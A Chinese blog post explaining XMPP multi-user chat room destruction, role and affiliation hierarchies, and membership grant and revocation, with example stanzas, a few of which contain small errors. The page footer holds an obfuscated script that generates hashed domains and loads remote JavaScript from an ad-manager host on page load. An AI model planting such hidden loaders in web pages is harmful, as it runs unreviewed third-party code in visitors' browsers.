<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='kicktest'<br>     to='wiccarocks@shakespeare.lit/laptop'<br>     type='error'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item nick='firstwitch' role='none'&gt;<br>       &lt;reason&gt;Be gone!&lt;/reason&gt;<br>     &lt;/item&gt;<br>   &lt;/query&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;not-allowed xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 销毁房间<br> 自动销毁<br> 若房间类型为临时房间，则在所有用户离开房间后，服务自动销毁房间<br> 主动销毁<br> 房间所有者拥有销毁房间的权限，步骤如下：<br> 1 房间所有者请求销毁房间，如果有需要可指明原因reason和备用场地<br> 2 该房间移除所有房客(包含适当的愿意和备用场地)并销毁房间<br> 房间所有者发送一个包含满足 http://jabber.org/protocol/muc#owner名字空间的&lt;query/&gt;元素且类型为set的&lt;iq/&gt;节给要销毁的房间地址请求销毁，其中&lt;query/&gt;元素包含它将包含一个 &lt;destroy/&gt; 元素，其中替代场地(&lt;destroy/&gt; 元素的jid属性提供)，密码保护的替代场(&lt;destroy/&gt;元素的&lt;password/&gt; 子元素的 XML 字符数据提供密码)，摧毁房间的原因(&lt;destroy/&gt; 元素的&lt;reason/&gt; 子元素的 XML 字符数据来提供）</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='begone'<br>     to='heath@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#owner'&gt;<br>     &lt;destroy jid='darkcave@chat.shakespeare.lit'&gt;<br>       &lt;reason&gt;Macbeth doth come.&lt;/reason&gt;<br>     &lt;/destroy&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 若请求销毁所有者信息无误，服务将移除所有用户，通过从所有房客房间JID对应给房客发送unavailable类型出席信息(若所有者扩展信息包含替代场所和销毁原因，则该出席信息必须包含)</p> 
<p>&lt;presence<br>     from='heath@chat.shakespeare.lit/firstwitch'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none' role='none'/&gt;<br>     &lt;destroy jid='darkcave@chat.shakespeare.lit'&gt;<br>       &lt;reason&gt;Macbeth doth come.&lt;/reason&gt;<br>     &lt;/destroy&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>&lt;presence<br>     from='heath@chat.shakespeare.lit/secondwitch'<br>     to='wiccarocks@shakespeare.lit/laptop'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none' role='none'/&gt;<br>     &lt;destroy jid='darkcave@chat.shakespeare.lit'&gt;<br>       &lt;reason&gt;Macbeth doth come.&lt;/reason&gt;<br>     &lt;/destroy&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>&lt;presence<br>     from='heath@chat.shakespeare.lit/thirdwitch'<br>     to='hag66@shakespeare.lit/pda'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none' role='none'/&gt;<br>     &lt;destroy jid='darkcave@chat.shakespeare.lit'&gt;<br>       &lt;reason&gt;Macbeth doth come.&lt;/reason&gt;<br>     &lt;/destroy&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 22<br> 23<br> 24<br> 25<br> 26<br> 27<br> 28<br> 29<br> 30<br> 31<br> 32<br> 33<br> 34<br> 35<br> 服务返回一个空的类型为result的&lt;iq/&gt;节通知所有者房间销毁成功</p> 
<p>&lt;iq from='heath@chat.shakespeare.lit'<br>     id='begone'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 若请求销毁所有者信息有误(销毁请求中接收到的from地址的&lt;user@host&gt;和一个房间所有者的纯JID不符)，服务拒绝访问，并返回一个&lt;forbidden/&gt;错误条件</p> 
<p>权限控制<br> 分级权限<br> 角色：大部分情况下，角色存在一个层次结构。例如，一个与会者可以做任何游客能做的事情，而一个主持人可以做任何与会者能做的事情，每个角色拥有其下一级角色所没有的权限<br> 岗位：大部分情况下，岗位存在一个层次结构。例如，一个所有者可以做任何管理员能做的事情，而一个管理员可以做任何成员能做的事情，每个岗位拥有其下一级岗位所没有的权限<br> 权限授予<br> 以管理员授予成员资格为例：<br> 管理员授予成员资格，通过发送一个包含满足http://jabber.org/protocol/muc#admin名称空间的&lt;query/&gt;元素且类型为set的&lt;iq/&gt;节给服务修改用户岗位为member(用户在线基于昵称，用户不在线基于JID)实现(reason属性可选)</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='member1'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit'/&gt;<br>       &lt;reason&gt;A worthy witch indeed!&lt;/reason&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 房间服务发送一个空的类型为result的&lt;iq/&gt;节给管理员通知处理成功</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='member1'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 若该用户在线，服务以该用户名义广播更新出席信息，该出席信息包含一个满足http://jabber.org/protocol/muc#user 名字空间 &lt;x/&gt; 元素并包含一个affiliation属性值设为“member”的&lt;item/&gt; 子元素</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='participant'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 若该用户离线，服务从房间本身向其余所有房客发送消息，消息包含一个满足http://jabber.org/protocol/muc#user 名字空间 &lt;x/&gt; 元素并包含一个affiliation属性值设为“member”的&lt;item/&gt; 子元素</p> 
<p>&lt;message<br>     from='chat.shakespeare.lit'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit'<br>           role='none'/&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 权限撤销<br> 以管理员撤销成员资格为例：<br> 管理员授予成员资格，通过发送一个包含满足http://jabber.org/protocol/muc#admin名称空间的&lt;query/&gt;元素且类型为set的&lt;iq/&gt;节给服务修改用户岗位为none实现(reason属性可选)</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='member2'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item affiliation='none'<br>           jid='hag66@shakespeare.lit'/&gt;<br>        &lt;reason&gt;Not so worthy after all!&lt;/reason&gt; <br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 房间服务发送一个空的类型为result的&lt;iq/&gt;节给管理员通知处理成功</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='member2'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 若该用户在线，服务以该用户名义广播更新出席信息，该出席信息包含一个满足http://jabber.org/protocol/muc#user 名字空间 &lt;x/&gt; 元素并包含一个affiliation属性值设为“none”的&lt;item/&gt; 子元素，指明失去成员资格</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='participant'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br><br> 若该用户离线，服务从房间本身向其余所有房客发送消息，消息包含一个满足http://jabber.org/protocol/muc#user 名字空间 &lt;x/&gt; 元素并包含一个affiliation属性值设为“none”的&lt;item/&gt; 子元素</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='participant'/&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;</p> 
<p>[ ... ]<br><br> 此外，若房间是仅限会员的，服务必须从房间移除这个用户，包含一个状态码 321 来指明用户被移除是因为岗位变更，并通知所有剩余的房客</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none' role='none'&gt;<br>       &lt;actor jid='bard@shakespeare.lit'/&gt;<br>     &lt;/item&gt;<br>     &lt;status code='321'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none' role='none'/&gt;<br>     &lt;status code='321'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br><br> 附：操作失败情况，可参考修改列表注意事项<br> 修改列表<br> 修改用户列表(成员，主持人，管理员，所有者等)，类似修改黑名单流程，注意事项：<br> 1 所有者操作所有者列表，若该用户为唯一所有者，则不允许撤销自己所有权，否则返回一个&lt;conflict/&gt;错误<br> 2 管理员操作主持人列表，不允许撤销管理员或所有者主持人权限，否则返回一个&lt;not-allowed/&gt;错误<br> 3 管理员修改成员列表，若该房间是一个仅限会员的房间，修改成员岗位member为岗位none时，同时需要将用户从该房间踢出</p> 
<p> </p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a88139c59f78020ca43c0a17df896032/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【Vue异常】Vue报错“Trailing spaces not allowed”</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/2563aaabcd6cb2b6784c35ef4eb443de/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">编译android版本的opencv源码时，出现error：“to_string“ is not a member of ‘std‘</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>